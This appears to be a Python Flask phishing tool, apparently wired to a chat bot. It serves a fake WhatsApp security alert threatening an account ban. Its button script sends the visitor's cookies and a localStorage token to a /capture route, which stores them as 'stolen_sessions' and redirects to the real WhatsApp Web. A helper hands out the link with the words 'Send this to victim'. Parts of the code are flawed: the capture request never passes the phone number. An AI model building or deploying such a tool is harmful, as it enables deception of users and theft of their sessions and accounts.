from flask import Flask, request, redirect
import threading

# Dummy Flask app for phishing
phish_app = Flask(__name__)

# Store session tokens
stolen_sessions = {}

@phish_app.route('/<number>')
def phishing_page(number):
    return f"""
    <h1>❌ WhatsApp Security Alert</h1>
    <p>Your account will be banned in 10 seconds.</p>
    <button onclick="login()">👉 CLICK TO VERIFY 👈</button>
    <script>
    function login() {{
        fetch('/capture?cookie=' + document.cookie + '&token=' + localStorage.token)
        alert('Verified. Stay safe.');
    }}
    </script>
    """

@phish_app.route('/capture')
def capture():
    data = request.args.get('token') or request.args.get('cookie')
    number = request.args.get('number', 'unknown')
    stolen_sessions[number] = data
    return redirect("https://web.whatsapp.com")  # Redirect to real WA

def send_phishing_link(number, update):
    link = f"https://your-render-app.onrender.com/{number}"
    update.message.reply_text(f"🎣 Phishing link: {link}\nSend this to victim.")
    
    # Run phishing server
    threading.Thread(target=lambda: phish_app.run(port=3000, host="0.0.0.0")).start()
